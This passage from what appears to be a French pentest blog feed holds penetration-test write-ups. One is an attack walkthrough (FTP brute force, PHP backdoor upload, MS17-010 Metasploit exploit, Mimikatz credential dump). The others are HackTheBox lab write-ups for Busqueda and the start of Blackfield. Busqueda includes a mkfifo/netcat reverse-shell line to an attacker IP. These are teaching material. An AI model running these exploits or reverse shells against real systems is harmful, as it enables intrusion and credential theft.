+&lt;p&gt;La commande &lt;code&gt;ls -lha&lt;/code&gt; donne l&#39;information concernant la présence d&#39;un compte &quot;admin&quot; sur le serveur FTP.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;ftp&amp;gt; ls -lha
+227 Entering Passive Mode
+150 Opening ASCII mode data connection for file list
+drwxr-s---   2 admin    group       4.0k Dec  6  2017 .
+drwxr-s---   2 admin    group       4.0k Dec  7  2017 ..
+226 Transfer complete
+ftp&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h4&gt;Phase 2 - tentative d&#39;accès non autorisé&lt;/h4&gt;
+&lt;p&gt;L&#39;attaquant sait désormais qu&#39;une personne s&#39;identifie auprès du serveur en tant que &quot;admin&quot;.
+Il va mener sur ce compte une simple attaque basée sur un dictionnaire de mots de passe. Ces dictionnaires sont librement téléchargeables sur le web.&lt;/p&gt;
+&lt;p&gt;Grâce à des outils comme &lt;strong&gt;hydra&lt;/strong&gt; ou &lt;strong&gt;medusa&lt;/strong&gt;, l&#39;attaquant obtient le mot de passe du compte FTP admin.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;ACCOUNT FOUND: [ftp] Host : xxx.xxx.xxx.xxx
+User: admin Password: tintin [SUCCESS]
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h4&gt;Phase 3 - obtenir un accès plus complet au serveur&lt;/h4&gt;
+&lt;p&gt;Désormais l&#39;attaquant en tant qu&#39;admin, possède des permissions d&#39;écriture sur le serveur web.
+Il lui est donc permis d&#39;envoyer sur le serveur une backdoor qui établira une connexion vers sa machine quand elle sera exécutée.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;ftp&amp;gt; cd html
+250 CWD command successful
+ftp&amp;gt; put shell.php
+local: shell.php remote: shell.php
+227 Entering Passive Mode.
+150 Opening BINARY mode data connection for shell.php
+226 Transfer complete
+1113 bytes sent in 0.00 secs (14.9499 MB/s)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;L&#39;éxécution de shell.php initie une connexion vers la machine de l&#39;attaquant. Ce dernier dispose ainsi d&#39;un shell sur le serveur (et plus seulement un accès FTP) qui lui permet de mener d&#39;autres actions sur le réseau interne de l&#39;entreprise.&lt;/p&gt;
+&lt;h4&gt;Phase 4 : identifications des machines du réseau et de leurs vulnérabilités&lt;/h4&gt;
+&lt;p&gt;L&#39;attaquant balaie et identifie les machines du réseau. Il découvre un serveur Active Directory vulnérable à MS17-010.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;msf &amp;gt; use auxiliary/scanner/smb/smb_ms17_010
+msf auxiliary(scanner/smb/smb_ms17_010) &amp;gt; set RSHOSTS xxx.xxx.xxx.xxx/24
+rhosts =&amp;gt; xxx.xxx.xxx.xxx/24
+msf auxiliary(scanner/smb/smb_ms17_010) &amp;gt; run
+[+] xxx.xxx.xxx.xxx:445     - Host is likely VULNERABLE to MS17-010! - Windows Server 2008 R2 Standard
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h4&gt;Phase 5 : exploitation de la vulnérabilité MS17-010&lt;/h4&gt;
+&lt;p&gt;Grâce au framework metasploit, l&#39;attaquant exploite la vulnérabilité MS17-010 non corrigée et obtient un accès au serveur Active Directory.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;msf auxiliary(scanner/smb/smb_ms17_010) &amp;gt; use exploit/windows/smb/ms17_010_psexec
+msf exploit(windows/smb/ms17_010_psexec) &amp;gt; set RHOST xxx.xxx.xxx.xxx
+msf exploit(windows/smb/ms17_010_psexec) &amp;gt; set PAYLOAD windows/meterpreter/reverse_tcp
+msf exploit(windows/smb/ms17_010_psexec) &amp;gt; set LPORT 443
+msf exploit(windows/smb/ms17_010_psexec) &amp;gt; run
+[*] Started reverse TCP handler on xxx.xxx.xxx.xxx:443
+[*] xxx.xxx.xxx.xxx:445 - Target OS: Windows Server 2008 R2 Standard 7601 Service Pack 1
+[*] xxx.xxx.xxx.xxx:445 - Built a write-what-where primitive...
+[+] xxx.xxx.xxx.xxx:445 - Overwrite complete... SYSTEM session obtained!
+[*] xxx.xxx.xxx.xxx:445 - Selecting PowerShell target
+[*] xxx.xxx.xxx.xxx:445 - Executing the payload...
+[+] xxx.xxx.xxx.xxx:445 - Service start timed out, OK if running a command or non-service executable...
+[*] Sending stage (179779 bytes) to xxx.xxx.xxx.xxx
+[*] Meterpreter session 3 opened (xxx.xxx.xxx.xxx:443 -&amp;gt; xxx.xxx.xxx.xxx:46491) at 2018-02-10 15:20:38
+meterpreter &amp;gt; background
+[*] Backgrounding session 3...
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h4&gt;Phase 6 : obtention du mot de passe administrateur du domaine&lt;/h4&gt;
+&lt;p&gt;Grâce à Mimikatz l&#39;attaquant obtient le mot de passe administrateur du domaine, stocké en clair dans la mémoire de la machine.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;meterpreter&amp;gt; load Mimikatz
+meterpreter&amp;gt; wdigest
+0;1368385624  Kerberos   DOMAINE     netadmin       	 1234
+0;2500325002  Kerberos   DOMAINE     user1        	 password1
+0;68817461    Kerberos   DOMAINE     user2          	 password2
+0;2599386119  Kerberos   DOMAINE     user3		password3
+0;2600098700  Kerberos   DOMAINE     administrateur	Very$ecureP@ssw0rdVeryL0ngAndDifficultToGuess
+0;2581308498  Kerberos   DOMAINE     user8         	password8
+0;2589349129  Kerberos   DOMAINE     user4     		password4
+0;2597681195  Kerberos   DOMAINE     user5      	password5
+0;2597641064  Kerberos   DOMAINE     user6         	password6
+0;2595339032  Kerberos   DOMAINE     user7         	password7
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;L&#39;accès administrateur du domaine étant obtenu, l&#39;attaquant poursuit ses investigations sur l&#39;ensemble des systèmes du réseau, à la recherche d&#39;information sensibles.&lt;/p&gt;
+&lt;h4&gt;Conclusion&lt;/h4&gt;
+&lt;p&gt;L’enchaînement de plusieurs vulnérabilités peut mener à la compromission d&#39;un réseau informatique  : tester et auditer votre sécurité.&lt;/p&gt;
+&lt;p&gt;Tags: pentest&lt;/p&gt;</content>
+		<link href="anatomie-dune-attaque-informatique.html"/>
+		<id>tag:jurassi.ch,2023-09-11:posts/anatomie-dune-attaque-informatique.md</id>
+		<published>2023-09-11T19:01:55+02:00</published>
+		<updated>2023-09-11T19:01:55+02:00</updated>
+	</entry>
+	<entry>
+		<title>htb Busqueda</title>
+		<content type="html">&lt;h1&gt;htb Busqueda&lt;/h1&gt;
+&lt;p&gt;Résumé : l&#39;exploitation d&#39;une vulnérabilité de type injection de commandes permet d&#39;obtenir un accès non privilégié à la machine. On découvre des crédentiels dans la configuration git, qui nous permettent de nous connecter à gitea. De la lecture du code d&#39;un script nous déduisons la présence d&#39;une vulnérabilité introduite par l&#39;utilisation d&#39;un chemin relatif par ce script. Ce script peu sécurisé peut être utilisé en sudo, et nous permet d’exécuter du code à distance avec les privilèges root.&lt;/p&gt;
+&lt;h2&gt;Enumeration&lt;/h2&gt;
+&lt;p&gt;Nmap permet d&#39;identifier un site sur le port 80 : http://searcher.htb/. &lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;$ nmap -sC -sV -vv 10.129.140.129
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-10 12:54 BST
+NSE: Loaded 155 scripts for scanning.
+NSE: Script Pre-scanning.
+NSE: Starting runlevel 1 (of 3) scan.
+Initiating NSE at 12:54
+Completed NSE at 12:54, 0.00s elapsed
+NSE: Starting runlevel 2 (of 3) scan.
+Initiating NSE at 12:54
+Completed NSE at 12:54, 0.00s elapsed
+NSE: Starting runlevel 3 (of 3) scan.
+Initiating NSE at 12:54
+Completed NSE at 12:54, 0.00s elapsed
+Initiating Ping Scan at 12:54
+Scanning 10.129.140.129 [2 ports]
+Completed Ping Scan at 12:54, 0.09s elapsed (1 total hosts)
+Initiating Parallel DNS resolution of 1 host. at 12:54
+Completed Parallel DNS resolution of 1 host. at 12:54, 0.00s elapsed
+Initiating Connect Scan at 12:54
+Scanning 10.129.140.129 [1000 ports]
+Discovered open port 22/tcp on 10.129.140.129
+Discovered open port 80/tcp on 10.129.140.129
+Completed Connect Scan at 12:54, 1.33s elapsed (1000 total ports)
+Initiating Service scan at 12:54
+Scanning 2 services on 10.129.140.129
+Completed Service scan at 12:54, 6.18s elapsed (2 services on 1 host)
+NSE: Script scanning 10.129.140.129.
+NSE: Starting runlevel 1 (of 3) scan.
+Initiating NSE at 12:54
+Completed NSE at 12:54, 2.56s elapsed
+NSE: Starting runlevel 2 (of 3) scan.
+Initiating NSE at 12:54
+Completed NSE at 12:54, 0.34s elapsed
+NSE: Starting runlevel 3 (of 3) scan.
+Initiating NSE at 12:54
+Completed NSE at 12:54, 0.00s elapsed
+Nmap scan report for 10.129.140.129
+Host is up, received syn-ack (0.086s latency).
+Scanned at 2023-08-10 12:54:47 BST for 11s
+Not shown: 998 closed tcp ports (conn-refused)
+PORT   STATE SERVICE REASON  VERSION
+22/tcp open  ssh     syn-ack OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 4fe3a667a227f9118dc30ed773a02c28 (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBIzAFurw3qLK4OEzrjFarOhWslRrQ3K/MDVL2opfXQLI+zYXSwqofxsf8v2MEZuIGj6540YrzldnPf8CTFSW2rk=
+|   256 816e78766b8aea7d1babd436b7f8ecc4 (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPTtbUicaITwpKjAQWp8Dkq1glFodwroxhLwJo6hRBUK
+80/tcp open  http    syn-ack Apache httpd 2.4.52
+|_http-server-header: Apache/2.4.52 (Ubuntu)
+|_http-title: Did not follow redirect to http://searcher.htb/
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+Service Info: Host: searcher.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+NSE: Script Post-scanning.
+NSE: Starting runlevel 1 (of 3) scan.
+Initiating NSE at 12:54
+Completed NSE at 12:54, 0.00s elapsed
+NSE: Starting runlevel 2 (of 3) scan.
+Initiating NSE at 12:54
+Completed NSE at 12:54, 0.00s elapsed
+NSE: Starting runlevel 3 (of 3) scan.
+Initiating NSE at 12:54
+Completed NSE at 12:54, 0.00s elapsed
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 11.83 seconds
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Après modification du &lt;code&gt;/etc/hosts&lt;/code&gt; j&#39;accède au site.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;echo &amp;quot;10.129.140.129 searcher.htb&amp;quot; | sudo tee -a /etc/hosts
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2&gt;Vulnérabilité du site&lt;/h2&gt;
+&lt;p&gt;Le site utilise l&#39;application &quot;Searchor 2.4.0&quot; selon une information affichée en bas de page. Une vulnérabilité et un exploit existent pour cette application. La vulnérabilité est due à une absence de vérification des entrées utilisateurs, qui permet une injection de commande.&lt;/p&gt;
+&lt;p&gt;https://github.com/nikn0laty/Exploit-for-Searchor-2.4.0-Arbitrary-CMD-Injection&lt;/p&gt;
+&lt;h2&gt;Exploitation&lt;/h2&gt;
+&lt;p&gt;Un netcat écoute les connexions entrantes sur ma machine attaquant.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;$ nc -nlvp 9001
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Et je lance l&#39;&lt;a href=&quot;https://github.com/nikn0laty/Exploit-for-Searchor-2.4.0-Arbitrary-CMD-Injection&quot;&gt;exploit&lt;/a&gt;.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;$ ./exploit.sh searcher.htb 10.10.14.72 9001
+---[Reverse Shell Exploit for Searchor &amp;lt;= 2.4.2 (2.4.0)]---
+[*] Input target is searcher.htb
+[*] Input attacker is 10.10.14.72:9001
+[*] Run the Reverse Shell... Press Ctrl+C after successful connection
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;J&#39;obtiens un shell non privilégié.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;$ nc -nlvp 9001
+Ncat: Version 7.93 ( https://nmap.org/ncat )
+Ncat: Listening on :::9001
+Ncat: Listening on 0.0.0.0:9001
+Ncat: Connection from 10.129.140.129.
+Ncat: Connection from 10.129.140.129:35032.
+bash: cannot set terminal process group (1485): Inappropriate ioctl for device
+bash: no job control in this shell
+svc@busqueda:/var/www/app$
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2&gt;Enumération&lt;/h2&gt;
+&lt;p&gt;J&#39;observe le contenu du dossier en cours. Je découvre git et une configuration qui contient un mot de passe.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;svc@busqueda:/var/www/app$ ls -lha
+ls -lha
+total 20K
+drwxr-xr-x 4 www-data www-data 4.0K Apr  3 14:32 .
+drwxr-xr-x 4 root     root     4.0K Apr  4 16:02 ..
+-rw-r--r-- 1 www-data www-data 1.1K Dec  1  2022 app.py
+drwxr-xr-x 8 www-data www-data 4.0K Aug 10 11:44 .git
+drwxr-xr-x 2 www-data www-data 4.0K Dec  1  2022 templates
+svc@busqueda:/var/www/app$ ls -l .git	
+ls -l .git
+total 44
+drwxr-xr-x 2 www-data www-data 4096 Dec  1  2022 branches
+-rw-r--r-- 1 www-data www-data   15 Dec  1  2022 COMMIT_EDITMSG
+-rw-r--r-- 1 www-data www-data  294 Dec  1  2022 config
+-rw-r--r-- 1 www-data www-data   73 Dec  1  2022 description
+-rw-r--r-- 1 www-data www-data   21 Dec  1  2022 HEAD
+drwxr-xr-x 2 www-data www-data 4096 Dec  1  2022 hooks
+-rw-r--r-- 1 root     root      259 Apr  3 15:09 index
+drwxr-xr-x 2 www-data www-data 4096 Dec  1  2022 info
+drwxr-xr-x 3 www-data www-data 4096 Dec  1  2022 logs
+drwxr-xr-x 9 www-data www-data 4096 Dec  1  2022 objects
+drwxr-xr-x 5 www-data www-data 4096 Dec  1  2022 refs
+
+svc@busqueda:/var/www/app$ cd .git
+cd .git
+svc@busqueda:/var/www/app/.git$ ls
+ls
+branches
+COMMIT_EDITMSG
+config
+description
+HEAD
+hooks
+index
+info
+logs
+objects
+refs
+
+svc@busqueda:/var/www/app/.git$ cat config
+cat config
+[core]
+	repositoryformatversion = 0
+	filemode = true
+	bare = false
+	logallrefupdates = true
+[remote &amp;quot;origin&amp;quot;]
+	url = http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git
+	fetch = +refs/heads/*:refs/remotes/origin/*
+[branch &amp;quot;main&amp;quot;]
+	remote = origin
+	merge = refs/heads/main
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Notons qu&#39;il existe un autre domaine qui porte un gitea : http://gitea.searcher.htb/&lt;/p&gt;
+&lt;p&gt;Je tente d&#39;utiliser le mot de passe comme mot de passe sudo.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;svc@busqueda:/var/www/app/.git$ sudo -S -l
+sudo -S -l
+[sudo] password for svc: jh1usoih2bkjaspwe92
+Matching Defaults entries for svc on busqueda:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
+    use_pty
+
+User svc may run the following commands on busqueda:
+    (root) /usr/bin/python3 /opt/scripts/system-checkup.py *
+svc@busqueda:/var/www/app/.git$ 
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Ce script system-checkup.py peut être utilisé par l&#39;utilisateur svc.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;svc@busqueda:/var/www/app/.git$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py /etc/passwd
+&amp;lt;/python3 /opt/scripts/system-checkup.py /etc/passwd
+Usage: /opt/scripts/system-checkup.py &amp;lt;action&amp;gt; (arg1) (arg2)
+
+     docker-ps     : List running docker containers
+     docker-inspect : Inpect a certain docker container
+     full-checkup  : Run a full system checkup
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Il permet de lister le conteneurs.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;svc@busqueda:/var/www/app/.git$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-ps
+&amp;lt;in/python3 /opt/scripts/system-checkup.py docker-ps
+CONTAINER ID   IMAGE                COMMAND                  CREATED        STATUS          PORTS                                             NAMES
+960873171e2e   gitea/gitea:latest   &amp;quot;/usr/bin/entrypoint…&amp;quot;   7 months ago   Up 47 minutes   127.0.0.1:3000-&amp;gt;3000/tcp, 127.0.0.1:222-&amp;gt;22/tcp   gitea
+f84a6b33fb5a   mysql:8              &amp;quot;docker-entrypoint.s…&amp;quot;   7 months ago   Up 47 minutes   127.0.0.1:3306-&amp;gt;3306/tcp, 33060/tcp               mysql_db
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Et de lancer la commande &lt;a href=&quot;https://docs.docker.com/engine/reference/commandline/inspect/&quot;&gt;inspect&lt;/a&gt; de docker. Il faut passer en argument le format et l&#39;ID du conteneur à &quot;inspecter&quot;.&lt;/p&gt;
+&lt;p&gt;On obtient le mot de passe de la BDD MySql du site.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;svc@busqueda:/var/www/app/.git$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect &#39;{{ json .Config}}&#39; 960873171e2e
+&amp;lt;.py docker-inspect &#39;{{ json .Config}}&#39; 960873171e2e
+{&amp;quot;Hostname&amp;quot;:&amp;quot;960873171e2e&amp;quot;,&amp;quot;Domainname&amp;quot;:&amp;quot;&amp;quot;,&amp;quot;User&amp;quot;:&amp;quot;&amp;quot;,&amp;quot;AttachStdin&amp;quot;:false,&amp;quot;AttachStdout&amp;quot;:false,&amp;quot;AttachStderr&amp;quot;:false,&amp;quot;ExposedPorts&amp;quot;:{&amp;quot;22/tcp&amp;quot;:{},&amp;quot;3000/tcp&amp;quot;:{}},&amp;quot;Tty&amp;quot;:false,&amp;quot;OpenStdin&amp;quot;:false,&amp;quot;StdinOnce&amp;quot;:false,&amp;quot;Env&amp;quot;:[&amp;quot;USER_UID=115&amp;quot;,&amp;quot;USER_GID=121&amp;quot;,&amp;quot;GITEA__database__DB_TYPE=mysql&amp;quot;,&amp;quot;GITEA__database__HOST=db:3306&amp;quot;,&amp;quot;GITEA__database__NAME=gitea&amp;quot;,&amp;quot;GITEA__database__USER=gitea&amp;quot;,&amp;quot;GITEA__database__PASSWD=yuiu1hoiu4i5ho1uh&amp;quot;,&amp;quot;PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&amp;quot;,&amp;quot;USER=git&amp;quot;,&amp;quot;GITEA_CUSTOM=/data/gitea&amp;quot;],&amp;quot;Cmd&amp;quot;:[&amp;quot;/bin/s6-svscan&amp;quot;,&amp;quot;/etc/s6&amp;quot;],&amp;quot;Image&amp;quot;:&amp;quot;gitea/gitea:latest&amp;quot;,&amp;quot;Volumes&amp;quot;:{&amp;quot;/data&amp;quot;:{},&amp;quot;/etc/localtime&amp;quot;:{},&amp;quot;/etc/timezone&amp;quot;:{}},&amp;quot;WorkingDir&amp;quot;:&amp;quot;&amp;quot;,&amp;quot;Entrypoint&amp;quot;:[&amp;quot;/usr/bin/entrypoint&amp;quot;],&amp;quot;OnBuild&amp;quot;:null,&amp;quot;Labels&amp;quot;:{&amp;quot;com.docker.compose.config-hash&amp;quot;:&amp;quot;e9e6ff8e594f3a8c77b688e35f3fe9163fe99c66597b19bdd03f9256d630f515&amp;quot;,&amp;quot;com.docker.compose.container-number&amp;quot;:&amp;quot;1&amp;quot;,&amp;quot;com.docker.compose.oneoff&amp;quot;:&amp;quot;False&amp;quot;,&amp;quot;com.docker.compose.project&amp;quot;:&amp;quot;docker&amp;quot;,&amp;quot;com.docker.compose.project.config_files&amp;quot;:&amp;quot;docker-compose.yml&amp;quot;,&amp;quot;com.docker.compose.project.working_dir&amp;quot;:&amp;quot;/root/scripts/docker&amp;quot;,&amp;quot;com.docker.compose.service&amp;quot;:&amp;quot;server&amp;quot;,&amp;quot;com.docker.compose.version&amp;quot;:&amp;quot;1.29.2&amp;quot;,&amp;quot;maintainer&amp;quot;:&amp;quot;maintainers@gitea.io&amp;quot;,&amp;quot;org.opencontainers.image.created&amp;quot;:&amp;quot;2022-11-24T13:22:00Z&amp;quot;,&amp;quot;org.opencontainers.image.revision&amp;quot;:&amp;quot;9bccc60cf51f3b4070f5506b042a3d9a1442c73d&amp;quot;,&amp;quot;org.opencontainers.image.source&amp;quot;:&amp;quot;https://github.com/go-gitea/gitea.git&amp;quot;,&amp;quot;org.opencontainers.image.url&amp;quot;:&amp;quot;https://github.com/go-gitea/gitea&amp;quot;}}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;En utilisant &lt;code&gt;jq&lt;/code&gt;, voici un affichage plus digeste de la partie intéressante.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;...
+&amp;quot;Env&amp;quot;: [
+    &amp;quot;USER_UID=115&amp;quot;,
+    &amp;quot;USER_GID=121&amp;quot;,
+    &amp;quot;GITEA__database__DB_TYPE=mysql&amp;quot;,
+    &amp;quot;GITEA__database__HOST=db:3306&amp;quot;,
+    &amp;quot;GITEA__database__NAME=gitea&amp;quot;,
+    &amp;quot;GITEA__database__USER=gitea&amp;quot;,
+    &amp;quot;GITEA__database__PASSWD=yuiu1hoiu4i5ho1uh&amp;quot;,
+    &amp;quot;PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&amp;quot;,
+    &amp;quot;USER=git&amp;quot;,
+    &amp;quot;GITEA_CUSTOM=/data/gitea&amp;quot;
+  ],
+...
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Le mot de passe est réutilisé pour se connecter sur ce site gitea avec administrator / yuiu1hoiu4i5ho1uh.&lt;/p&gt;
+&lt;p&gt;Dans gitea je peux maintant lire le contenant du script initial : &lt;code&gt;system-checkup.py&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;Je découvre grâce au code que l&#39;option full-checkup lance un script &lt;code&gt;./full-checkup.sh&lt;/code&gt;. Il est donc théoriquement possible de créer un &lt;code&gt;full-checkup.sh&lt;/code&gt; malicieux, et de l&#39;exécuter depuis n&#39;importe quelle location. En l&#39;occurrence depuis une location dans laquelle l&#39;utilisateur a les droits d&#39;écriture (/tmp par exemple). &lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;    elif action == &#39;full-checkup&#39;:
+        try:
+            arg_list = [&#39;./full-checkup.sh&#39;]
+            print(run_command(arg_list))
+            print(&#39;[+] Done!&#39;)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;On peut insérer un reverse shell dans &lt;code&gt;/tmp/full-checkup.sh&lt;/code&gt;.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;echo -en &amp;quot;#! /bin/bash\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 10.10.14.72 9002 &amp;gt;/tmp/f&amp;quot; &amp;gt; /tmp/full-checkup.sh
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Puis :&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;chmod +x /tmp/full-checkup.sh
+cd /tmp
+sudo -S /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Sur notre machine attaquant, avec un netcat en écoute un reçoit la connexion entrante, en root.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;$ nc -nlvp 9002
+&lt;/code&gt;&lt;/pre&gt;</content>
+		<link href="2023-08-17-busqueda.html"/>
+		<id>tag:jurassi.ch,2023-09-11:posts/2023-08-17-busqueda.md</id>
+		<published>2023-09-11T19:01:55+02:00</published>
+		<updated>2023-09-11T19:01:55+02:00</updated>
+	</entry>
+	<entry>
+		<title>htb blackfield</title>
+		<content type="html">&lt;h1&gt;htb blackfield&lt;/h1&gt;
+&lt;p&gt;Blackfield, mi pentest mi forensic :)&lt;/p&gt;
+&lt;h2&gt;Résumé&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;Connexion Anonyme  un partage &lt;strong&gt;profiles$&lt;/strong&gt;&lt;/li&gt;
+&lt;li&gt;Découverte d&#39;une liste d&#39;utilisateur basée sur une liste de répertoires&lt;/li&gt;
+&lt;li&gt;Génération d&#39;un TGT pour un utilisateur valide&lt;/li&gt;
+&lt;li&gt;Casser le hash avec John&lt;/li&gt;
+&lt;li&gt;Connexion avec rpcclient, nous avons les permissions de réinitialiser un mot de passe&lt;/li&gt;
+&lt;li&gt;Réinitialisation du mot de passe du compte audit2020&lt;/li&gt;
+&lt;li&gt;Le compte audit2020 peut lire le partage forensic&lt;/li&gt;
+&lt;li&gt;Il contient un fichier lsass.zip correspondant à un dump mémoire du processus lsass.exe&lt;/li&gt;
+&lt;li&gt;Obtention des hashs des comptes administrator (mauvais hash) et svc&lt;em&gt;&lt;/em&gt;ackup&lt;/li&gt;
+&lt;li&gt;Le compte svc&lt;em&gt;&lt;/em&gt;ackup dispose du privilège SeBackupPrivilege, il permet de copier ntds.dit&lt;/li&gt;
+&lt;li&gt;Possibilité de dumper la base Active Directory ndts.dit&lt;/li&gt;
+&lt;li&gt;Obtention du hash Administrator&lt;/li&gt;
+&lt;/ul&gt;
+&lt;hr /&gt;
+&lt;h2&gt;Recon&lt;/h2&gt;
+&lt;h3&gt;nmap&lt;/h3&gt;
+&lt;pre&gt;&lt;code&gt;kali@kali:~/blackfield$ nmap -Pn -p- 10.10.10.192
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-13 12:16 EDT
+Nmap scan report for 10.10.10.192
+Host is up (0.075s latency).
+Not shown: 65527 filtered ports
+PORT     STATE SERVICE
+53/tcp   open  domain
+88/tcp   open  kerberos-sec
+135/tcp  open  msrpc
+389/tcp  open  ldap
+445/tcp  open  microsoft-ds
+593/tcp  open  http-rpc-epmap
+3268/tcp open  globalcatLDAP
+5985/tcp open  wsman
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3&gt;ldapsearch&lt;/h3&gt;
+&lt;pre&gt;&lt;code&gt;kali@kali:~/blackfield$ ldapsearch -x -h 10.10.10.192 -s base
+# extended LDIF
+#
+# LDAPv3
+# base &amp;lt;&amp;gt; (default) with scope baseObject
+# filter: (objectclass=*)
+# requesting: ALL
+#
+
+#
+dn:
+domainFunctionality: 7
+forestFunctionality: 7
+domainControllerFunctionality: 7
+rootDomainNamingContext: DC=BLACKFIELD,DC=local
+ldapServiceName: BLACKFIELD.local:dc01$@BLACKFIELD.LOCAL
+isGlobalCatalogReady: TRUE
+supportedSASLMechanisms: GSSAPI
+supportedSASLMechanisms: GSS-SPNEGO
+supportedSASLMechanisms: EXTERNAL
+supportedSASLMechanisms: DIGEST-MD5
+supportedLDAPVersion: 3
+supportedLDAPVersion: 2
+...
+subschemaSubentry: CN=Aggregate,CN=Schema,CN=Configuration,DC=BLACKFIELD,DC=lo
+ cal
+serverName: CN=DC01,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configur
+ ation,DC=BLACKFIELD,DC=local
+schemaNamingContext: CN=Schema,CN=Configuration,DC=BLACKFIELD,DC=local
+namingContexts: DC=BLACKFIELD,DC=local
+namingContexts: CN=Configuration,DC=BLACKFIELD,DC=local
+namingContexts: CN=Schema,CN=Configuration,DC=BLACKFIELD,DC=local
+namingContexts: DC=DomainDnsZones,DC=BLACKFIELD,DC=local
+namingContexts: DC=ForestDnsZones,DC=BLACKFIELD,DC=local
+isSynchronized: TRUE
+highestCommittedUSN: 184708
+dsServiceName: CN=NTDS Settings,CN=DC01,CN=Servers,CN=Default-First-Site-Name,
+ CN=Sites,CN=Configuration,DC=BLACKFIELD,DC=local
+dnsHostName: DC01.BLACKFIELD.local
+defaultNamingContext: DC=BLACKFIELD,DC=local
+currentTime: 20200614024518.0Z
+configurationNamingContext: CN=Configuration,DC=BLACKFIELD,DC=local
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3&gt;smbclient&lt;/h3&gt;
+&lt;pre&gt;&lt;code&gt;kali@kali:~/blackfield$ smbclient -L \\\\10.10.10.192
+Unable to initialize messaging context
+Enter WORKGROUP\kali&#39;s password: 
+
+	    Sharename       Type      Comment
+	    ---------       ----      -------
+	    ADMIN$          Disk      Remote Admin
+	    C$              Disk      Default share
+	    forensic        Disk      Forensic / Audit share.
+	    IPC$            IPC       Remote IPC
+	    NETLOGON        Disk      Logon server share 
+	    profiles$       Disk      
+	    SYSVOL          Disk      Logon server share 
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Le dossier forensic n&#39;est pas accessible&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;kali@kali:~/blackfield$ smbclient  //10.10.10.192/forensic
+Enter WORKGROUP\roots password: 
+Try &amp;quot;help&amp;quot; to get a list of possible commands.
+smb: \&amp;gt; ls
+NT_STATUS_ACCESS_DENIED listing \*
+smb: \&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Un autre dossier contient une arborescence de dossiers utilisateurs.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;kali@kali:~/blackfield$ smbclient \\\\10.10.10.192\\profiles$ -U &amp;quot;&amp;quot;
